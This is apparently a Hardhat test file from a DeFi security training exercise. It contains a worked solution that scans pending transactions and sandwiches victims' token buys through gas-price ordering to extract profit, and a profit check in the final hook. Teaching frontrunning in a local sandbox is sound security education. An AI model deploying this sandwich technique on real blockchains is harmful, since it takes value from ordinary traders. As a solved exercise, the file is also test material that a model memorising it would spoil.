const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Frontrunning Attack Exercise 3', function () {

    let deployer, user1, user2, attacker;

    const WETH_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"

    const INITIAL_MINT = ethers.utils.parseEther('1000000'); 
    const INITIAL_LIQUIDITY = ethers.utils.parseEther('100000'); 
    const ETH_IN_LIQUIDITY = ethers.utils.parseEther('100');
    const USER1_SWAP = ethers.utils.parseEther('120');
    const USER2_SWAP = ethers.utils.parseEther('100');
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, attacker] = await ethers.getSigners()
        let signers = [deployer, user1, user2, attacker]

        // Everyone starts with 300 ETH
        for(let i = 0; i < signers.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                signers[i].address,
                "0x1043561A8829300000", // 300 ETH
            ]);
        }

        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
        
        this.weth = await ethers.getContractAt(
            "contracts/interfaces/IWETH9.sol:IWETH9",
            WETH_ADDRESS
        );
    });

    it('Deployment', async function () {

        this.ChocolateFactory = await ethers.getContractFactory(
            'contracts/frontrunning-3/Chocolate.sol:Chocolate',
            deployer
        );
        this.chocolate = await this.ChocolateFactory.deploy(INITIAL_MINT);

        let pairAddress = await this.chocolate.uniswapV2Pair();
        this.pair = await ethers.getContractAt(
            "contracts/interfaces/IUniswapV2.sol:IUniswapV2Pair",
            pairAddress
        );
    });

    it('Deployer adds liquidity', async function () {
        await this.chocolate.approve(this.chocolate.address, INITIAL_LIQUIDITY);
        await this.chocolate.addChocolateLiquidity(INITIAL_LIQUIDITY, {value: ETH_IN_LIQUIDITY});
    });

    it('User swap', async function () {
        
        // User1 swaps 120 ETH to Chocolate
        await this.chocolate.connect(user1).swapChocolates(
            this.weth.address, USER1_SWAP,
            {value: USER1_SWAP, gasPrice: 0x4133810a0}
        );

        // User2 swaps 100 ETH to Chocolate
        await this.chocolate.connect(user2).swapChocolates(
            this.weth.address, USER2_SWAP,
            {value: USER2_SWAP, gasPrice: 0x4133110a0}
        );

    });
    
    it('Did someone ask for noise?', async function () {
        for (let i = 0; i < 10; i++) {
            await deployer.sendTransaction({
                to: ethers.Wallet.createRandom().address,
                value: ethers.utils.parseEther('0.01'),
            });
        }
    });
    
    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        // Get all pending transactions
        let pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
            "pending",
            true,
        ]);
        let pendingTxs = pendingBlock.transactions

        // Deploy sandwich smart contract
        let SandwichFactory = await ethers.getContractFactory(
            'contracts/frontrunning-3/solution/Sandwich.sol:Sandwich',
            attacker
        );
        let sandwichContract = await SandwichFactory.deploy(this.weth.address, this.chocolate.address);

        const chocolateInterface = this.ChocolateFactory.interface
        
        // Iterate over all the pending transactions
        for(let i = 0; i < pendingTxs.length; i++) {
            let rawTx = pendingTxs[i];

            // Skip the transaction if it's not to the chocolate smart contract
            if(rawTx.to.toLowerCase() != this.chocolate.address.toLowerCase()) {
                continue;
            }

            let parsedTx = chocolateInterface.parseTransaction({
                data: rawTx.input, value: rawTx.value
            });
            
            // Skip the transaction if it's not to the swapChocolates function
            if(parsedTx.signature != "swapChocolates(address,uint256)") {
                continue;
            }

            // Skip sell chocolate transactions
            if(parsedTx.args._tokenIn.toLowerCase() != this.weth.address.toLowerCase()){
                continue
            }

            let purchaseWith = (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther('1'))

            // Buy transaction
            await sandwichContract.sandwich(
                true, {value: purchaseWith, gasPrice: ethers.BigNumber.from(rawTx.gasPrice).add(1)}
            );

            // ~~ Here will be the victim's buy transactions that we're going to sandwich ~~ //

            // Sell Transaction
            await sandwichContract.sandwich(
                false,  {gasPrice: ethers.BigNumber.from(rawTx.gasPrice).sub(1)}
            )

        }

        // We need sandwich the user
        // To buy before the user, to sell after the user
    });

    after(async function () {

        // Mine all the transactions
        await ethers.provider.send('evm_mine', []);

        // Attacker suppose to make more than 110 ETH in profit!
        attackerETHBalance = await ethers.provider.getBalance(attacker.address)
        console.log("attackerETHBalance after: ", attackerETHBalance)
        expect(attackerETHBalance).to.be.greaterThan(
            this.attackerInitialETHBalance.add(ethers.utils.parseEther('200'))
        )
        
    });
});
